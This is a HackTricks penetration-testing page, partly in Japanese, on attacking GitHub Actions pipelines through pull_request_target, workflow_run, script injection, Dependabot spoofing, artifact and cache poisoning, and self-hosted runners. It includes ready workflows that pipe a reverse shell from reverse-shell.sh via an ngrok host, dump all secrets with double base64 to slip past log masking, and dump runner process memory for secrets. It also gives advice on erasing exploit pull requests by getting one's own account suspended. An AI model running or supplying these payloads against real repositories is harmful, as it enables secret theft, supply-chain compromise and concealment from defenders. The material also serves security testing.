# Github Actionsの悪用

{{#include ../../../banners/hacktricks-training.md}}

## ツール

以下のツールはGithub Actionのワークフローを見つけ、脆弱なものを検出するのに便利です:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## 基本情報

このページには次の内容が含まれます:

- 攻撃者がGithub Actionにアクセスした場合の**すべての影響の要約**
- Actionに**アクセスする方法**:
- Actionを作成するための**権限**を持っていること
- **pull request**関連のトリガーを悪用すること
- その他の**外部アクセス**手法を悪用すること
- 既に侵害されたリポジトリからの**Pivoting**
- 最後に、Action内部から悪用するための**post-exploitation techniques**に関するセクション（上記の影響を引き起こす）

## 影響の概要

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

リポジトリ内で**GitHub Actionsで任意のコードを実行できる**場合、次のことが可能になるかもしれません:

- パイプラインにマウントされた**秘密情報を盗む**とともに、パイプラインの権限を**悪用して**AWSやGCPなどの外部プラットフォームへの不正アクセスを得ることができる。
- **デプロイメントを侵害する**およびその他の**アーティファクト**を改ざんできる。
- パイプラインがアセットをデプロイまたは保存している場合、最終製品を改変してサプライチェーン攻撃を可能にすることができる。
- **カスタムワーカー上でコードを実行する**ことで計算リソースを悪用し、他のシステムへPivotすることができる。
- `GITHUB_TOKEN`に紐づく権限に応じて、**リポジトリのコードを上書きする**ことが可能です。

## GITHUB_TOKEN

この"secret"（`${{ secrets.GITHUB_TOKEN }}` および `${{ github.token }}` から取得）は、管理者がこのオプションを有効にしたときに付与されます:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

このトークンは**Github Applicationが使用するものと同じ**ため、同じエンドポイントにアクセスできます: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Githubは[**flow**](https://github.com/github/roadmap/issues/74)を公開し、GitHub内で**リポジトリ間アクセスを許可**するようにするべきです。これにより、あるリポジトリが`GITHUB_TOKEN`を使って他の内部リポジトリにアクセスできるようになります。

このトークンの可能な**権限**は次で確認できます: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

注意: このトークンは**ジョブ完了後に失効する**ことに注意してください.\
これらのトークンは次のようになります: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできることの例:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> いくつかの場合に、**github user tokens inside Github Actions envs or in the secrets** を見つけられることがあります。これらのトークンはリポジトリや組織に対してより多くの権限を与える可能性があります。

<details>

<summary>Github Action の出力にある secrets を一覧表示する</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets を使って reverse shell を取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

他のユーザのリポジトリでGithub Tokenに付与された権限は、actionsの**checking the logs**で確認できます:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Allowed Execution

> [!NOTE]
> これはGithub actionsを侵害する最も簡単な方法です。このケースは、あなたが**create a new repo in the organization**する権限、またはリポジトリに対する**write privileges over a repository**を持っていることを想定しています。
>
> この状況にある場合は、[Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action)を確認してください。

### Execution from Repo Creation

組織のメンバーが**create new repos**でき、かつあなたがgithub actionsを実行できる場合、**create a new repo and steal the secrets set at organization level**ことが可能です。

### Execution from a New Branch

既にGithub Actionが設定されているリポジトリで**create a new branch in a repository that already contains a Github Action**ことができれば、それを**modify**し、コンテンツを**upload**してから、**execute that action from the new branch**できます。こうして**exfiltrate repository and organization level secrets**（ただしそれらがどの名前で設定されているかを知っている必要があります）。

> [!WARNING]
> workflow YAML内だけに実装された制限（例えば、`on: push: branches: [main]`、ジョブの条件式、または手動ゲート）はコラボレーターによって編集可能です。外部からの強制（branch protections、protected environments、protected tags）がなければ、貢献者はワークフローのターゲットを自分のブランチに向け直して、マウントされたsecrets/permissionsを悪用できます。

修正したactionは、**manually,** **PR is created**時、または**some code is pushed**時に実行可能にできます（どれだけ目立ちたくないかによります）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## フォークされた実行

> [!NOTE]
> 攻撃者が**別のリポジトリの Github Action を実行する**ことを可能にするさまざまなトリガーがあります。これらのトリガー可能なアクションが不適切に設定されていると、攻撃者がそれらを侵害する可能性があります。

### `pull_request`

ワークフロートリガー **`pull_request`** は、いくつかの例外を除き、プルリクエストが受信されるたびにワークフローを実行します：デフォルトでは、**初めて**コラボレーションする場合、プロジェクトの**メンテナー**がワークフローの**実行**を**承認**する必要があります：

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> デフォルトの制限は**初回の**コントリビューターに対するものなので、妥当なバグやタイプミスの修正で貢献した後に、**新しい `pull_request` 権限を悪用するための別の PR を送る**ことが可能になる場合があります。
>
> **私はこれを試しましたが動きませんでした**: ~~プロジェクトに貢献した誰かの名前でアカウントを作成し、その人のアカウントを削除するという別の選択肢があるかもしれません。~~

さらに、デフォルトではターゲットリポジトリへの**書き込み権限**と**secrets へのアクセス**を防ぎます。詳細は[**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)に記載されています：

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

攻撃者は Github Action の定義を変更して任意の処理を実行したり、任意のアクションを追加したりすることができます。しかし、前述の制限により、secrets を盗んだりリポジトリを上書きしたりすることはできません。

> [!CAUTION]
> **はい、攻撃者がPR内でトリガーされる github action を変更した場合、使用されるのは元リポジトリのものではなく攻撃者の Github Action になります！**

実行されるコードも攻撃者が制御しているため、`GITHUB_TOKEN` に secrets や書き込み権限が無くても、例えば**悪意のあるアーティファクトをアップロードする**ことが可能です。

### **`pull_request_target`**

ワークフロートリガー **`pull_request_target`** はターゲットリポジトリへの**書き込み権限**と**secrets へのアクセス**を持ち（許可を求めません）。

ワークフロートリガー **`pull_request_target`** は**base context で実行され**、PR が与えるコンテキストでは実行されません（**信頼できないコードを実行しないため**）。`pull_request_target` の詳細は[**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target)を参照してください。\
さらに、この特定の危険な使用法については[**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)を参照してください。

実行されるワークフローが**base**で定義されたもので**PR内のものではない**ため、**`pull_request_target`** を使うことは安全に見えるかもしれませんが、そうではないケースがいくつかあります。

こちらは**secrets へのアクセス**を持ちます。

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
さらに、ドキュメントによると: `workflow_run` イベントで開始されたワークフローは、前のワークフローがそうでなくても **secrets にアクセスし、write tokens を使用することができる** とされています。

この種のワークフローは、外部ユーザーが **`pull_request`** または **`pull_request_target`** を介して **トリガーできる** **workflow** に **依存している** 場合、攻撃対象になり得ます。いくつかの脆弱な例は [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** 最初の例は、`workflow_run` トリガーのワークフローが攻撃者のコード `${{ github.event.pull_request.head.sha }}` をダウンロードするものです。二つ目の例は、**untrusted** コードからの **artifact** を **`workflow_run`** ワークフローに **渡し**、そのアーティファクトの内容を RCE に **脆弱な方法で使用する**ものです。

### `workflow_call`

TODO

TODO: pull_request から実行されたときに、使用／ダウンロードされるコードが元リポジトリのものかフォークされた PR のものかを確認する

## フォーク実行の悪用

外部攻撃者が github ワークフローを実行させる方法はすべて述べました。ここでは、これらの実行が不適切に設定されている場合にどのように悪用され得るかを見ていきます:

### Untrusted checkout の実行

`pull_request` の場合、ワークフローは PR のコンテキストで実行されます（つまり悪意ある PR のコードが実行されます）が、誰かが事前に承認する必要があり、いくつかの [limitations](#pull_request) の下で実行されます。

もしワークフローが **`pull_request_target` or `workflow_run`** を使い、`pull_request_target` や `pull_request` からトリガー可能なワークフローに依存している場合、元のリポジトリのコードが実行されるため、**攻撃者は実行されるコードを制御できません**。

> [!CAUTION]
> ただし、もしその **action** が **明示的な PR checkout** を行い **PR からコードを取得する**（base からではない）場合、攻撃者が制御するコードが使用されます。例えば（PR のコードがダウンロードされる行 12 を確認してください）:

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

ビルドスクリプトや参照される **packages** は PR の作成者によって制御されるため、`npm install` や `npm build` の実行中に潜在的に **untrusted code が実行されます**。

> [!WARNING]
> 脆弱な actions を検索するための github dork は: `event.pull_request pull_request_target extension:yml` ですが、action が不適切に設定されていても、ジョブを安全に実行するように設定する方法はいくつかあります（例えば PR を作成する actor に関する条件を使うなど）。

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

PR を作成する **ユーザー** によって値が **制御される** 特定の [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) がある点に注意してください。もし github action がその **data を使って何かを実行する** と、任意のコード実行につながる可能性があります:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ドキュメントによると: 環境変数を定義または更新し、それを **`GITHUB_ENV`** 環境ファイルに書き込むことで、ワークフロージョブの以降の任意のステップでその **環境変数を利用可能にできます**。

攻撃者がこの **env** 変数に **任意の値を注入できる** 場合、以降のステップでコードを実行させるような環境変数（例: **LD_PRELOAD** や **NODE_OPTIONS**）を注入できる可能性があります。

例えば（[**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) と [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)）、アップロードされた artifact の内容を **`GITHUB_ENV`** 環境変数に格納することを信頼しているワークフローを想像してください。攻撃者はそれを悪用するためにこのようなものをアップロードできます:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

[**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest) に示されているように、いくつかの組織は `dependabot[bot]` からの PR をマージする Github Action を持っており、次のようなケースがあります:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- Fork the victim repository
- Add the malicious payload to your copy
- Enable Dependabot on your fork adding an outdated dependency. Dependabot will create a branch fixing the dependency with malicious code.
- Open a Pull Request to the victim repository from that branch (the PR will be created by the user so nothing will happen yet)
- Then, attacker goes back to the initial PR Dependabot opened in his fork and runs `@dependabot recreate`
- Then, Dependabot perform some actions in that branch, that modified the PR over the victim repo, which makes `dependabot[bot]` the actor of the latest event that triggered the workflow (and therefore, the workflow runs).

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
元のブログ記事はこの挙動を悪用するための2つの方法を提案しており、以下はそのうちの2つ目です：

- 被害者のリポジトリを Fork し、古い依存関係を持つよう Dependabot を有効にする。
- 悪意ある shell injection コードを含む新しい branch を作成する。
- その branch をリポジトリの default branch に変更する。
- この branch から被害者リポジトリへ PR を作成する。
- Fork に Dependabot が開いた PR で `@dependabot merge` を実行する。
- Dependabot はフォークしたリポジトリの default branch に変更をマージし、被害者リポジトリ側の PR を更新する。これにより、ワークフローをトリガーした最新イベントの actor が `dependabot[bot]` になり、悪意あるブランチ名が使われる。

### 脆弱なサードパーティの Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

前述の [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) で説明されているように、この Github Action は別のワークフローやリポジトリの artifacts にアクセスすることを許可する。

問題は、**`path`** パラメータが設定されていない場合、artifact がカレントディレクトリに展開され、ワークフロー内で後に使用されたり実行されたりする可能性のあるファイルを上書きしてしまう点にある。したがって、Artifact が脆弱な場合、攻撃者はこれを悪用してその Artifact を信頼する他のワークフローを侵害できる可能性がある。

脆弱なワークフローの例：
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
これは次のワークフローで攻撃できます:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## その他の外部アクセス

### Deleted Namespace Repo Hijacking

アカウントが名前を変更すると、しばらく経ってから他のユーザーがその名前でアカウントを登録できる可能性があります。もし repository が名前変更前に **less than 100 stars previously to the change of name** だった場合、Github は同じ名前で登録した新しいユーザーに、削除されたものと **同じ名前の repository を作成**することを許可します。

> [!CAUTION]
> したがって、action が存在しないアカウントの repo を使用している場合、攻撃者がそのアカウントを作成して action を侵害する可能性があります。

もし他の repository がこのユーザーの repo からの **dependencies** を使用していた場合、攻撃者はそれらをハイジャックすることができます。詳しい説明はこちら: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> このセクションでは、最初の repo に何らかのアクセス権があると仮定して、ある repo から別の repo に **pivot from one repo to another** ことを可能にする技術について説明します（前のセクションを参照）。

### Cache Poisoning

同一 branch 内の **workflow runs** 間で cache が維持されます。つまり、攻撃者が cache に保存され、その後 **more privileged** な workflow によって **downloaded** され実行される **package** を **compromise** できれば、その workflow も **compromise** されます。

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows は **artifacts from other workflows and even repos** を使うことがあります。攻撃者が後で別の workflow によって使用される artifact を **uploads an artifact** する Github Action を **compromise** できれば、他の workflows も **compromise** することができます:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

このことは [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass) で説明されているように、repository や organization が特定の actions の使用を制限する policy を設定していても、攻撃者は workflow 内で action を単に download（`git clone`）して、それを local action として参照することができます。policy は local paths に影響を与えないため、**その action は何の制限もなく実行されます。**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDCを介したAWSとGCPへのアクセス

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### secretsへのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトにコンテンツを注入している場合、secrets にどのようにアクセスできるかを知っておくと役立ちます：

- secret または token が **環境変数** に設定されている場合、**`printenv`** を使って環境から直接アクセスできます。

<details>

<summary>Github Action の出力で secrets を一覧表示</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secretsを使ってreverse shellを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
- ```bash
cat /home/runner/work/_temp/*
```
- For a JavaScript action the secrets are sent through environment variables
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerate all secrets via the secrets context (collaborator level). A contributor with write access can modify a workflow on any branch to dump all repository/org/environment secrets. Use double base64 to evade GitHub’s log masking and decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Self-hosted runners の悪用

The way to find which **Github Actions are being executed in non-github infrastructure** is to search for **`runs-on: self-hosted`** in the Github Action configuration yaml.

**Self-hosted** runners might have access to **extra sensitive information**, to other **network systems** (vulnerable endpoints in the network? metadata service?) or, even if it's isolated and destroyed, **more than one action might be run at the same time** and the malicious one could **steal the secrets** of the other one.

In self-hosted runners it's also possible to obtain the **secrets from the \_Runner.Listener**\_\*\* process\*\* which will contain all the secrets of the workflows at any step by dumping its memory:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker イメージのレジストリ

Github actions を使って **Docker イメージを Github 内にビルドして保存する** ワークフローを作成できます。\
以下の折りたたみで例を確認できます:

<details>

<summary>Github Action - Docker イメージのビルドとプッシュ</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

前のコードでわかるように、Github レジストリは **`ghcr.io`** にホストされています。

リポジトリに対して read permissions を持つユーザーは、personal access token を使って Docker Image をダウンロードできるようになります:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
その後、ユーザーは **leaked secrets in the Docker image layers:** を検索できます。

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Sensitive info in Github Actions logs

たとえ **Github** が Actions のログ内の機密値を検出してそれらを表示しないようにしても、アクション実行中に生成される可能性のある **他の機密データ** は隠されません。例えば、秘密値で署名された JWT は [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) されていない限り隠されません。

## Covering your Tracks

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) まず、作成した PR は Github 上で一般に公開され、ターゲットの GitHub アカウントにも明確に表示されます。GitHub ではデフォルトでインターネット上の PR を削除することはできませんが、ここに落とし穴があります。Github がアカウントを **suspended** すると、そのアカウントのすべての **PR は自動的に削除され** インターネットから消えます。したがって、自分の活動を隠すには、自分の **GitHub account suspended or get your account flagged** される必要があります。これにより GitHub 上のあなたのすべての活動がインターネットから **隠されます**（基本的にあなたの exploit PR をすべて削除することになります）。

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> 組織が自分たちが狙われたことに気づくための唯一の方法は、GitHub の UI からは PR が削除されてしまうため、SIEM から GitHub ログを確認することです。

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
